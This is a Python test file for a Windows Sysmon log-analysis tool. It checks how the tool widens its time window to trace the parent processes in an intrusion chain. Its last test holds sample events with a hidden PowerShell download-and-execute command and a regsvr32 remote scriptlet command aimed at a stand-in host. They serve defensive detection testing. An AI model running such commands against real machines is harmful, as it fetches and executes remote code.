from __future__ import annotations

from datetime import datetime, timezone
from pathlib import Path
import tempfile
import unittest
from unittest import mock
from xml.sax.saxutils import escape

from cat_app import server
from cat_app.adaptive_range import incident_focus_anchors, recommend_expanded_range, root_trace_gaps
from cat_app.models import EventRecord, ParseResult


def _utc(hour: int, minute: int = 0) -> datetime:
    return datetime(2026, 9, 1, hour, minute, tzinfo=timezone.utc)


def _parse_result(*, before: int = 0, after: int = 0) -> ParseResult:
    return ParseResult(
        records=[],
        files=[],
        errors=[],
        total_seen=before + after,
        total_in_range=0,
        earliest_event_time=_utc(8),
        latest_event_time=_utc(14),
        events_before_range=before,
        events_after_range=after,
    )


def _server_parse_result(*, before: int = 0) -> ParseResult:
    return ParseResult(
        records=[
            EventRecord(
                source_file="range.xml",
                event_id="1",
                provider="Microsoft-Windows-Sysmon",
                channel="Microsoft-Windows-Sysmon/Operational",
                computer="HOST-A",
                time_created=_utc(10, 5),
                record_id="1",
            )
        ],
        files=[{"name": "range.xml", "scan_complete": True}],
        errors=[],
        total_seen=before + 1,
        total_in_range=1,
        earliest_event_time=_utc(8),
        latest_event_time=_utc(14),
        events_before_range=before,
    )


def _run_server_analysis(
    parse_side_effect: list[object],
    analyze_side_effect: list[object],
    *,
    auto_expand: bool = True,
) -> tuple[dict[str, object], mock.Mock]:
    handler = object.__new__(server.CATRequestHandler)
    handler.path = "/api/analyze"
    handler.headers = {}
    handler._parse_multipart = mock.Mock(
        return_value=(
            {
                "timezone": "UTC",
                "start_time": "2026-09-01T10:00",
                "end_time": "2026-09-01T12:00",
                "max_records": "100",
                "agent_backend": "rule",
                "auto_expand_time_range": "true" if auto_expand else "false",
            },
            [{"path": "/tmp/range.xml", "size": 1}],
        )
    )
    handler._json = mock.Mock()
    handler._error = mock.Mock()
    with mock.patch.object(
        server,
        "parse_event_files",
        side_effect=parse_side_effect,
    ), mock.patch.object(
        server,
        "analyze_events",
        side_effect=analyze_side_effect,
    ), mock.patch.object(
        server,
        "generate_rule_report",
        return_value=("report", {"backend": "rule", "used": False}),
    ), mock.patch.object(server, "_stage_log"):
        server.CATRequestHandler.do_POST(handler)
    if handler._error.called:
        raise AssertionError(f"unexpected server error: {handler._error.call_args}")
    payload = handler._json.call_args.args[0]
    return payload, handler._json


def _unresolved_parent_analysis() -> dict[str, object]:
    return {
        "scope": {"start_utc": "2026-09-01T10:00:00Z", "end_utc": "2026-09-01T12:00:00Z"},
        "findings": [],
        "suspicious_events": [{"time": "2026-09-01T11:30:00Z"}],
        "intrusion_chain": {
            "observed_trigger_process": {
                "host": "HOST-A", "process_guid": "{child}", "process_id": "123",
                "process": r"C:\Windows\System32\regsvr32.exe",
                "creation_event_observed": True, "start_time": "2026-09-01T11:30:00Z",
                "source_ref": "range.xml#10", "parent_process_guid": "{parent}",
                "parent_process_instance_id": None,
            },
        },
    }


class AdaptiveRangeTests(unittest.TestCase):
    def test_missing_parent_identity_expands_even_far_from_range_boundary(self) -> None:
        decision = recommend_expanded_range(
            _unresolved_parent_analysis(), _parse_result(before=10),
            _utc(10), _utc(12), enabled=True,
        )
        self.assertEqual(decision.start_utc, _utc(9))
        self.assertEqual(decision.end_utc, _utc(12))
        self.assertIn("부모", decision.reasons[0])

    def test_missing_file_creator_expands_without_model_date_authority(self) -> None:
        analysis = {"intrusion_chain": {"file_provenance": [{
            "time": "2026-09-01T11:30:00Z", "source_refs": ["range.xml#20"],
            "creator_process_guid": "{writer}", "creator_process_instance_id": None,
            "target_filename": r"C:\Temp\payload.dll",
        }]}}
        decision = recommend_expanded_range(
            analysis, _parse_result(before=10), _utc(10), _utc(12), enabled=True,
        )
        self.assertTrue(decision.expanded)
        self.assertEqual(root_trace_gaps(analysis)[0]["kind"], "file_creator_creation")

    def test_ordinary_os_ancestry_does_not_trigger_repeated_lookback(self) -> None:
        analysis = {"intrusion_chain": {"upstream_process_context": [{
            "role": "upstream_context", "process": r"C:\Windows\explorer.exe",
            "source_ref": "range.xml#1", "creation_event_observed": True,
            "parent_process_guid": "{winlogon}", "parent_process_instance_id": None,
        }]}}
        self.assertEqual(root_trace_gaps(analysis), [])

    def test_exponential_lookback_is_capped_relative_to_requested_start(self) -> None:
        parsed = _parse_result(before=10)
        parsed.earliest_event_time = _utc(0)
        decision = recommend_expanded_range(
            _unresolved_parent_analysis(), parsed, _utc(9), _utc(12), enabled=True,
            round_index=2, requested_start_utc=_utc(10), max_lookback_seconds=2 * 3600,
            allow_end_expansion=False,
        )
        self.assertEqual(decision.start_utc, _utc(8))
        stopped = recommend_expanded_range(
            _unresolved_parent_analysis(), parsed, _utc(8), _utc(12), enabled=True,
            round_index=3, requested_start_utc=_utc(10), max_lookback_seconds=2 * 3600,
            allow_end_expansion=False,
        )
        self.assertFalse(stopped.expanded)

    def test_observed_upstream_source_at_edge_recovers_earlier_context(self) -> None:
        analysis = {
            "suspicious_events": [{"time": "2026-09-01T11:30:00Z"}],
            "intrusion_chain": {
                "origin_process": {
                    "start_time": "2026-09-01T10:02:00Z",
                    "creation_event_observed": True,
                },
            },
        }
        decision = recommend_expanded_range(
            analysis, _parse_result(before=10), _utc(10), _utc(12), enabled=True,
        )
        self.assertEqual(decision.start_utc, _utc(9))
        self.assertEqual(decision.end_utc, _utc(12))

    def test_unobserved_origin_hint_does_not_expand_range(self) -> None:
        analysis = {"intrusion_chain": {
            "origin_process": {"start_time": "2026-09-01T10:02:00Z", "creation_event_observed": False},
            "origin_assessment": {"recommended_lookback_before": "2026-09-01T10:00:00Z"},
        }}
        decision = recommend_expanded_range(
            analysis, _parse_result(before=10), _utc(10), _utc(12), enabled=True,
        )
        self.assertFalse(decision.expanded)

    def test_expands_both_edges_for_boundary_evidence_and_clamps_to_input(self) -> None:
        analysis = {
            "suspicious_events": [
                {"time": "2026-09-01T10:05:00Z"},
                {"time": "2026-09-01T11:55:00Z"},
            ]
        }
        parsed = _parse_result(before=20, after=30)

        decision = recommend_expanded_range(
            analysis,
            parsed,
            _utc(10),
            _utc(12),
            enabled=True,
            edge_seconds=15 * 60,
            window_seconds=60 * 60,
        )

        self.assertTrue(decision.expanded)
        self.assertEqual(decision.start_utc, _utc(9))
        self.assertEqual(decision.end_utc, _utc(13))
        self.assertEqual(len(decision.reasons), 2)
        metadata = decision.metadata(
            enabled=True,
            requested_start_utc=_utc(10),
            requested_end_utc=_utc(12),
            parse_result=parsed,
        )
        self.assertTrue(metadata["expanded"])
        self.assertEqual(metadata["available_events_before_requested_range"], 20)
        self.assertEqual(metadata["available_events_after_requested_range"], 30)

    def test_does_not_expand_without_actionable_evidence(self) -> None:
        decision = recommend_expanded_range(
            {"findings": []},
            _parse_result(before=20, after=30),
            _utc(10),
            _utc(12),
            enabled=True,
        )

        self.assertFalse(decision.expanded)
        self.assertEqual(decision.start_utc, _utc(10))
        self.assertEqual(decision.end_utc, _utc(12))

    def test_does_not_expand_when_disabled_or_no_outside_events_exist(self) -> None:
        analysis = {
            "findings": [
                {
                    "severity": "high",
                    "first_seen": "2026-09-01T10:01:00Z",
                    "last_seen": "2026-09-01T11:59:00Z",
                }
            ]
        }
        disabled = recommend_expanded_range(
            analysis,
            _parse_result(before=10, after=10),
            _utc(10),
            _utc(12),
            enabled=False,
        )
        unavailable = recommend_expanded_range(
            analysis,
            _parse_result(),
            _utc(10),
            _utc(12),
            enabled=True,
        )

        self.assertFalse(disabled.expanded)
        self.assertFalse(unavailable.expanded)

    def test_ignores_low_severity_finding_outside_edge(self) -> None:
        analysis = {
            "findings": [
                {
                    "severity": "low",
                    "first_seen": "2026-09-01T10:01:00Z",
                    "last_seen": "2026-09-01T11:59:00Z",
                }
            ]
        }

        decision = recommend_expanded_range(
            analysis,
            _parse_result(before=10, after=10),
            _utc(10),
            _utc(12),
            enabled=True,
        )

        self.assertFalse(decision.expanded)

    def test_server_applies_second_pass_and_closes_both_parse_results(self) -> None:
        first = _server_parse_result(before=10)
        second = _server_parse_result()
        first.close = mock.Mock(wraps=first.close)
        second.close = mock.Mock(wraps=second.close)
        initial = {
            "scope": {
                "start_utc": "2026-09-01T10:00:00Z",
                "end_utc": "2026-09-01T12:00:00Z",
            },
            "findings": [],
            "suspicious_events": [{"time": "2026-09-01T10:05:00Z"}],
        }
        expanded = {
            "scope": {
                "start_utc": "2026-09-01T09:00:00Z",
                "end_utc": "2026-09-01T12:00:00Z",
            },
            "findings": [],
            "suspicious_events": [],
        }

        payload, _ = _run_server_analysis([first, second], [initial, expanded])

        self.assertTrue(payload["ok"])
        metadata = payload["analysis"]["adaptive_time_range"]
        self.assertTrue(metadata["expanded"])
        self.assertTrue(metadata["applied"])
        self.assertEqual(metadata["requested_start_utc"], "2026-09-01T10:00:00Z")
        self.assertEqual(metadata["effective_start_utc"], "2026-09-01T09:00:00Z")
        self.assertIn("initial_parser", metadata)
        self.assertEqual(
            payload["analysis"]["scope"]["start_utc"],
            "2026-09-01T09:00:00Z",
        )
        self.assertEqual(
            payload["analysis"]["scope"]["requested_start_utc"],
            "2026-09-01T10:00:00Z",
        )
        self.assertEqual(first.close.call_count, 1)
        self.assertEqual(second.close.call_count, 1)

    def test_server_falls_back_and_closes_second_result_when_reanalysis_fails(self) -> None:
        first = _server_parse_result(before=10)
        second = _server_parse_result()
        first.close = mock.Mock(wraps=first.close)
        second.close = mock.Mock(wraps=second.close)
        initial = {
            "scope": {
                "start_utc": "2026-09-01T10:00:00Z",
                "end_utc": "2026-09-01T12:00:00Z",
            },
            "findings": [],
            "suspicious_events": [{"time": "2026-09-01T10:05:00Z"}],
        }

        payload, _ = _run_server_analysis(
            [first, second],
            [initial, RuntimeError("synthetic second-pass failure")],
        )

        self.assertTrue(payload["ok"])
        self.assertIs(payload["analysis"], initial)
        metadata = payload["analysis"]["adaptive_time_range"]
        self.assertTrue(metadata["expanded"])
        self.assertFalse(metadata["applied"])
        self.assertIn("최초 선택 범위 결과", metadata["expansion_error"])
        self.assertEqual(
            payload["analysis"]["scope"]["start_utc"],
            "2026-09-01T10:00:00Z",
        )
        self.assertEqual(first.close.call_count, 1)
        self.assertEqual(second.close.call_count, 1)

    def test_server_repeats_lookback_with_fixed_incident_anchors(self) -> None:
        first, second, third = (_server_parse_result(before=value) for value in (20, 10, 0))
        initial = _unresolved_parent_analysis()
        intermediate = _unresolved_parent_analysis()
        resolved = {"scope": {}, "findings": [], "suspicious_events": []}
        with mock.patch.object(server, "analyze_events", side_effect=[intermediate, resolved]) as analyze_mock, mock.patch.object(
            server, "parse_event_files", side_effect=[second, third],
        ) as parse_mock, mock.patch.object(server, "_stage_log"):
            result = server._expand_analysis_context(
                initial, first, [Path("range.xml")], _utc(10), _utc(12),
                max_records=100, enabled=True, request_id="test", request_start=0,
            )
        metadata = result["adaptive_time_range"]
        self.assertEqual(metadata["rounds_completed"], 2)
        self.assertEqual(metadata["effective_start_utc"], "2026-09-01T08:00:00Z")
        self.assertEqual(parse_mock.call_args_list[0].args[1], _utc(9))
        self.assertEqual(parse_mock.call_args_list[1].args[1], _utc(8))
        for call in analyze_mock.call_args_list:
            self.assertEqual(call.kwargs["focus_anchors"], incident_focus_anchors(initial))

    def test_server_honors_opt_out_with_unresolved_parent(self) -> None:
        parsed = _server_parse_result(before=10)
        parsed.close = mock.Mock(wraps=parsed.close)
        payload, _ = _run_server_analysis([parsed], [_unresolved_parent_analysis()], auto_expand=False)
        metadata = payload["analysis"]["adaptive_time_range"]
        self.assertFalse(metadata["applied"])
        self.assertEqual(metadata["stop_reason"], "disabled")
        self.assertEqual(parsed.close.call_count, 1)

    def test_server_enforces_round_limit_and_reports_missing_logs(self) -> None:
        first, second = _server_parse_result(before=20), _server_parse_result(before=10)
        with mock.patch.object(server, "DEFAULT_AUTO_EXPAND_MAX_ROUNDS", 1):
            payload, _ = _run_server_analysis(
                [first, second], [_unresolved_parent_analysis(), _unresolved_parent_analysis()],
            )
        metadata = payload["analysis"]["adaptive_time_range"]
        self.assertEqual(metadata["rounds_completed"], 1)
        self.assertEqual(metadata["stop_reason"], "max_rounds")
        self.assertTrue(metadata["limit_reached"])
        self.assertTrue(metadata["additional_logs_required"])
        self.assertEqual(metadata["missing_evidence"][0]["process_guid"], "{parent}")

    def test_server_reports_when_uploaded_logs_do_not_reach_parent_creation(self) -> None:
        payload, _ = _run_server_analysis([_server_parse_result()], [_unresolved_parent_analysis()])
        metadata = payload["analysis"]["adaptive_time_range"]
        self.assertEqual(metadata["rounds_completed"], 0)
        self.assertEqual(metadata["stop_reason"], "no_earlier_uploaded_logs")
        self.assertTrue(metadata["additional_logs_required"])

    def test_server_does_not_start_next_pass_after_time_budget(self) -> None:
        parsed = _server_parse_result(before=10)
        parsed.close = mock.Mock(wraps=parsed.close)
        with mock.patch.object(server, "perf_counter", side_effect=[0, 601, 601]), mock.patch.object(
            server, "parse_event_files",
        ) as parse_mock:
            result = server._expand_analysis_context(
                _unresolved_parent_analysis(), parsed, [Path("range.xml")], _utc(10), _utc(12),
                max_records=100, enabled=True, request_id="test", request_start=0,
            )
        parse_mock.assert_not_called()
        self.assertEqual(parsed.close.call_count, 1)
        self.assertEqual(result["adaptive_time_range"]["stop_reason"], "time_budget")
        self.assertTrue(result["adaptive_time_range"]["limit_reached"])

    def test_server_retains_last_successful_expansion_when_later_parse_fails(self) -> None:
        first, second = _server_parse_result(before=20), _server_parse_result(before=10)
        first.close = mock.Mock(wraps=first.close)
        second.close = mock.Mock(wraps=second.close)
        intermediate = _unresolved_parent_analysis()
        intermediate["scope"]["start_utc"] = "2026-09-01T09:00:00Z"
        payload, _ = _run_server_analysis(
            [first, second, RuntimeError("synthetic parser failure")],
            [_unresolved_parent_analysis(), intermediate],
        )
        self.assertIs(payload["analysis"], intermediate)
        metadata = intermediate["adaptive_time_range"]
        self.assertEqual(metadata["rounds_completed"], 1)
        self.assertEqual(metadata["effective_start_utc"], "2026-09-01T09:00:00Z")
        self.assertEqual(metadata["stop_reason"], "expansion_error")
        self.assertIn("마지막 성공한 분석 결과", metadata["expansion_error"])
        self.assertEqual(first.close.call_count, 1)
        self.assertEqual(second.close.call_count, 1)

    def test_server_preserves_successful_scope_if_incident_focus_is_lost(self) -> None:
        initial = _unresolved_parent_analysis()
        lost = {"intrusion_chain": {"source": {"focus_unresolved": True}}}
        payload, _ = _run_server_analysis(
            [_server_parse_result(before=10), _server_parse_result()], [initial, lost],
        )
        self.assertIs(payload["analysis"], initial)
        metadata = initial["adaptive_time_range"]
        self.assertEqual(metadata["stop_reason"], "incident_focus_unavailable")
        self.assertEqual(metadata["effective_start_utc"], "2026-09-01T10:00:00Z")
        self.assertFalse(metadata["applied"])

    def test_real_xml_recovers_two_generations_before_requested_time(self) -> None:
        def xml_event(record_id: int, time: str, image: str, guid: str, parent: str = "", command: str = "") -> str:
            fields = {"ProcessGuid": guid, "ProcessId": str(100 + record_id), "Image": image,
                      "ParentProcessGuid": parent, "CommandLine": command or image}
            data = "".join(f'<Data Name="{key}">{escape(value)}</Data>' for key, value in fields.items())
            return f'''<Event><System><Provider Name="Microsoft-Windows-Sysmon"/>
                <EventID>1</EventID><Channel>Microsoft-Windows-Sysmon/Operational</Channel>
                <Computer>HOST-A</Computer><EventRecordID>{record_id}</EventRecordID>
                <TimeCreated SystemTime="2026-09-01T{time}:00Z"/></System>
                <EventData>{data}</EventData></Event>'''

        events = [
            xml_event(1, "07:00", r"C:\Windows\notepad.exe", "{normal}"),
            xml_event(2, "08:15", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "{unrelated}",
                      command="powershell.exe -nop -w hidden -Command IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/noise')"),
            xml_event(3, "08:30", r"C:\Users\alice\Downloads\invoice.exe", "{origin}"),
            xml_event(4, "09:30", r"C:\Windows\System32\cmd.exe", "{shell}", "{origin}"),
            xml_event(5, "11:30", r"C:\Windows\System32\regsvr32.exe", "{trigger}", "{shell}",
                      "regsvr32.exe /s /u /i:https://example.invalid/payload.sct scrobj.dll"),
        ]
        with tempfile.TemporaryDirectory(prefix="cat-lookback-test-") as directory:
            path = Path(directory) / "range.xml"
            path.write_text("<Events>" + "".join(events) + "</Events>", encoding="utf-8")
            parsed = server.parse_event_files([path], _utc(10), _utc(12), 100)
            initial = server.analyze_events(parsed, _utc(10), _utc(12))
            with mock.patch.object(server, "_stage_log"):
                result = server._expand_analysis_context(
                    initial, parsed, [path], _utc(10), _utc(12), max_records=100,
                    enabled=True, request_id="test", request_start=0,
                )
        self.assertEqual(result["adaptive_time_range"]["rounds_completed"], 2)
        self.assertEqual(result["intrusion_chain"]["origin_process"]["process_guid"], "{origin}")
        self.assertEqual(result["intrusion_chain"]["observed_trigger_process"]["process_guid"], "{trigger}")
        self.assertTrue(result["intrusion_chain"]["source"]["focus_preserved"])
        self.assertEqual(result["adaptive_time_range"]["effective_start_utc"], "2026-09-01T07:00:00Z")


if __name__ == "__main__":
    unittest.main()
